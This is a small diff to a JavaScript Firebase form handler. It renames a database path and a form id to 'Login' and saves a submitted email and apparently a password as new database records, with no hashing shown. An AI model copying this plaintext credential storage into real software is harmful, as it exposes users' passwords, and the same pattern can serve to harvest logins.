@@ -10,10 +10,10 @@ var firebaseConfig = {
   
   firebase.initializeApp(firebaseConfig);
 
-  var fire = firebase.database().ref("fouaa");
-  var dusra = document.getElementById("fouaa");
+  var fire = firebase.database().ref("Login");
+  var dusra = document.getElementById("Login");
  if(dusra){
-  document.getElementById("fouaa").addEventListener("submit", submitForm);
+  document.getElementById("Login").addEventListener("submit", submitForm);
  }
   function submitForm(e) {
     e.preventDefault();
@@ -25,8 +25,8 @@ var firebaseConfig = {
   }
   var saveMessages = (ema,passu) => {
 
-    var fouaaRef = firebase.database().ref("fouaa");
-    var newContactForm = fouaaRef.push();
+    var LoginRef = firebase.database().ref("Login");
+    var newContactForm = LoginRef.push();
     
     newContactForm.set({
       
